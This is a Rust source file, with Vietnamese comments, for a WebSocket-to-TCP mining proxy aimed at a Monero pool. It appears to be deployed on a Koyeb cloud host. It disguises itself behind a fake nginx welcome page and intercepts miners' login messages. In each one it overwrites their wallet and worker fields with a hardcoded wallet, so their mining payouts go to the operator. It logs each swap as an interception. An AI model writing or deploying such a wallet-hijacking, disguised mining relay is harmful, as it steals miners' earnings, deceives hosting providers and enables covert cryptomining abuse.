use axum::{
    extract::{WebSocketUpgrade, ws::{Message, WebSocket}, State},
    response::{Html, IntoResponse},
    routing::get,
    Router,
};
use std::{sync::{Arc, atomic::{AtomicUsize, Ordering}}, net::SocketAddr, time::Instant};
use tokio::net::TcpStream;
use tokio::io::{AsyncWriteExt, AsyncBufReadExt, BufReader};
use tokio::sync::mpsc::{self, UnboundedSender};
use futures_util::{StreamExt, SinkExt};
use serde_json::Value;
use colored::*;
use chrono::Utc;

// =================================================================
// ⚙️ CẤU HÌNH (SỬA VÍ CỦA BẠN TẠI ĐÂY)
// =================================================================
const LISTEN_ADDR: &str = "0.0.0.0:8080";

// 🔥 QUAN TRỌNG: Đổi sang port 80 để tránh bị firewall của Cloud/Pool chặn
const REAL_POOL_ADDR: &str = "pool.supportxmr.com:3333";

// Ví của bạn
const MY_WALLET: &str = "44hQZfLkTccVGood4aYMTm1KPyJVoa9esLyq1bneAvhkchQdmFTx3rsD3KRwpXTUPd1iTF4VVGYsTCLYrxMZVsvtKqAmBiw";

const MY_WORKER: &str = "Koyeb_Worker";

const NGINX_WELCOME: &str = r#"<!DOCTYPE html><html><head><title>Welcome to nginx!</title><style>body{width:35em;margin:0 auto;font-family:Tahoma,Verdana,Arial,sans-serif;}</style></head><body><h1>Welcome to nginx!</h1><p>If you see this page, the nginx web server is successfully installed and working.</p></body></html>"#;

enum LogEvent {
    ShareSent,
    ShareAccepted(usize, usize),
    WalletSwapped,
    ConnectError(String),
    Disconnected(u64, usize),
}

struct ProxyStats {
    shares_sent: AtomicUsize,
    shares_accepted: AtomicUsize,
    start_time: Instant,
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt::init();

    let (log_tx, mut log_rx) = mpsc::unbounded_channel::<LogEvent>();
    
    // Luồng Log
    tokio::spawn(async move {
        while let Some(event) = log_rx.recv().await {
            let time = Utc::now().format("%H:%M:%S");
            match event {
                LogEvent::ShareSent => { /* Tắt log spam */ }
                LogEvent::ShareAccepted(ok, total) => {
                    let ratio = if total > 0 { (ok as f64 / total as f64) * 100.0 } else { 0.0 };
                    println!("{} [{}] SHARE ACCEPTED ({}/{}) - Ratio: {:.2}%", "✅".green().bold(), time, ok, total, ratio);
                }
                LogEvent::WalletSwapped => {
                    println!("{} [{}] Login Intercepted -> Wallet Swapped", "💀".magenta(), time);
                }
                LogEvent::ConnectError(e) => println!("{} Pool Connection Error: {}", "❌".red(), e),
                LogEvent::Disconnected(uptime, accepted) => {
                    println!("{} Disconnected. Uptime: {}s. Accepted: {}", "🔌".yellow(), uptime, accepted);
                }
            }
        }
    });

    // ⚠️ BỎ MIDDLEWARE NGINX SPOOFER VÌ NÓ GÂY LỖI TRÊN KOYEB/CLOUD
    let app = Router::new()
        .route("/", get(mining_handler))
        .route("/*path", get(mining_handler)) 
        .with_state(log_tx);

    let addr: SocketAddr = LISTEN_ADDR.parse().expect("Invalid IP");
    
    println!("{}", "========================================".green());
    println!("{} {}", "☁️  CLOUD PROXY RUNNING ON".green().bold(), addr);
    println!("🔗 Pool: {}", REAL_POOL_ADDR.cyan());
    println!("💰 Wallet: {}", MY_WALLET.yellow());
    println!("{}", "========================================".green());

    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
    axum::serve(listener, app).await.unwrap();
}

async fn mining_handler(
    ws: Option<WebSocketUpgrade>,
    State(log_tx): State<UnboundedSender<LogEvent>>,
) -> Response {
    match ws {
        Some(w) => w.on_upgrade(move |socket| mining_tunnel(socket, log_tx)),
        None => Html(NGINX_WELCOME).into_response()
    }
}

async fn mining_tunnel(socket: WebSocket, log_tx: UnboundedSender<LogEvent>) {
    // 1. Kết nối Pool (TCP)
    let tcp_stream = match TcpStream::connect(REAL_POOL_ADDR).await {
        Ok(s) => s,
        Err(e) => {
            let _ = log_tx.send(LogEvent::ConnectError(e.to_string()));
            return;
        }
    };

    if let Err(_) = tcp_stream.set_nodelay(true) {}

    let (read_half, mut pool_write) = tcp_stream.into_split();
    let mut pool_reader = BufReader::with_capacity(16 * 1024, read_half);
    let (mut ws_write, mut ws_read) = socket.split();

    let stats = Arc::new(ProxyStats {
        shares_sent: AtomicUsize::new(0),
        shares_accepted: AtomicUsize::new(0),
        start_time: Instant::now(),
    });

    // --- LUỒNG 1: MINER (WS) -> POOL (TCP) ---
    let stats_miner = stats.clone();
    let log_tx_miner = log_tx.clone();

    let client_to_server = tokio::spawn(async move {
        while let Some(Ok(msg)) = ws_read.next().await {
            match msg {
                Message::Text(text) => {
                    // Logic Thay Ví
                    if text.contains("login") || text.contains("Login") {
                        if let Ok(mut json) = serde_json::from_str::<Value>(&text) {
                            let mut modified = false;
                            if let Some(params) = json.get_mut("params") {
                                if let Some(obj) = params.as_object_mut() {
                                    obj.insert("login".to_string(), serde_json::json!(MY_WALLET));
                                    obj.insert("user".to_string(), serde_json::json!(MY_WALLET));
                                    obj.insert("pass".to_string(), serde_json::json!(MY_WORKER));
                                    modified = true;
                                } else if let Some(arr) = params.as_array_mut() {
                                    if !arr.is_empty() { 
                                        arr[0] = serde_json::json!(MY_WALLET); 
                                        modified = true; 
                                    }
                                }
                            }
                            if modified {
                                let mut final_msg = json.to_string();
                                final_msg.push('\n');
                                if pool_write.write_all(final_msg.as_bytes()).await.is_err() { break; }
                                if pool_write.flush().await.is_err() { break; } // 🔥 FLUSH NGAY
                                let _ = log_tx_miner.send(LogEvent::WalletSwapped);
                                continue;
                            }
                        }
                    }

                    // Forward Share
                    if pool_write.write_all(text.as_bytes()).await.is_err() { break; }
                    
                    // Đảm bảo xuống dòng
                    if !text.ends_with('\n') { 
                        if pool_write.write_u8(b'\n').await.is_err() { break; } 
                    }
                    
                    // 🔥 FLUSH LÀ QUAN TRỌNG TRÊN CLOUD
                    if pool_write.flush().await.is_err() { break; }

                    if text.contains("submit") {
                        stats_miner.shares_sent.fetch_add(1, Ordering::Relaxed);
                        let _ = log_tx_miner.send(LogEvent::ShareSent);
                    }
                },
                // 🔥 QUAN TRỌNG: XỬ LÝ PING/PONG CHO CLOUD LOAD BALANCER
                Message::Ping(payload) => {
                    // Nếu Koyeb gửi Ping, ta phải Pong lại để giữ kết nối
                    // Axum thường tự xử lý, nhưng việc nhận message này giữ vòng lặp while hoạt động
                },
                Message::Pong(_) => {},
                Message::Binary(_) => {},
                Message::Close(_) => break,
            }
        }
    });

    // --- LUỒNG 2: POOL (TCP) -> MINER (WS) ---
    let stats_pool = stats.clone();
    let log_tx_pool = log_tx.clone();

    let server_to_client = tokio::spawn(async move {
        let mut line_buffer = String::with_capacity(1024);
        loop {
            line_buffer.clear();
            match pool_reader.read_line(&mut line_buffer).await {
                Ok(0) => break, // EOF
                Ok(_) => {
                    if ws_write.send(Message::Text(line_buffer.clone())).await.is_err() { break; }

                    if line_buffer.contains("OK") || (line_buffer.contains("result") && !line_buffer.contains("null")) {
                        let sent = stats_pool.shares_sent.load(Ordering::Relaxed);
                        if sent > 0 {
                            let ok = stats_pool.shares_accepted.fetch_add(1, Ordering::Relaxed) + 1;
                            let _ = log_tx_pool.send(LogEvent::ShareAccepted(ok, sent));
                        }
                    }
                }
                Err(_) => break,
            }
        }
    });

    let _ = tokio::select! { _ = client_to_server => {}, _ = server_to_client => {} };

    let _ = log_tx.send(LogEvent::Disconnected(
        stats.start_time.elapsed().as_secs(),
        stats.shares_accepted.load(Ordering::Relaxed)
    ));
}
